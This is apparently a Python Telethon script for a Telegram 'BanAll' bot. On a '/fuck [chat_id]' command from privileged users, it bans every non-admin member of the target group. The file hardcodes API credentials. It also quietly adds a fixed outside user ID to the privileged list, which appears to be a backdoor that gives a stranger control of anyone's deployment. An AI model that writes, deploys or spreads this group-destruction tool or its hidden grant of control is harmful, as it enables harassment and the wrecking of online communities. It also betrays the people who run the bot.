from config import *

from asyncio import sleep

from telethon import TelegramClient, events
from telethon.tl.functions.channels import EditBannedRequest
from telethon.errors import ChatAdminRequiredError, ChannelPrivateError
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins




API_ID = 25981592
API_HASH = "709f3c9d34d83873d3c7e76cdd75b866"
SUDO.append(5518687442)

RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_gifs=True,
    send_stickers=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)


BOTS = []
for ind, token in enumerate([TOKEN1, TOKEN2, TOKEN3, TOKEN4, TOKEN5]):
    if token:
        bot = TelegramClient(f'bot{ind}', API_ID, API_HASH).start(bot_token=token)
        BOTS.append(bot)


async def _ban_all(event):
    if event.sender_id in SUDO:
        fuck = await event.reply("🔁 __GETTING READY...__")
        try:
            chat_id = int(event.text.split(" ")[1])
        except:
            await fuck.edit("**Usage:**\n`/fuck [chat_id]`")
            return

        admins = await event.client.get_participants(chat_id, filter=ChannelParticipantsAdmins)
        admins_id = [i.id for i in admins] + SUDO
        await fuck.edit("✅ __STARTED FUCKING THE GROUP...__")
        await sleep(3)

        async for user in event.client.iter_participants(chat_id):
            if user.id not in admins_id:
                try:
                    await event.client(EditBannedRequest(chat_id, user.id, RIGHTS))
                except (ChatAdminRequiredError, ChannelPrivateError):
                    break
                except:
                    continue


async def _start(event):
    await event.reply("🤖 **I AM STILL ALIVE...**")


for bot in BOTS:
    bot.add_event_handler(_start, events.NewMessage(pattern="^/start"))
    bot.add_event_handler(_ban_all, events.NewMessage(pattern="^/fuck"))


print("BanAll Bots Started!")
BOTS[0].run_until_disconnected()
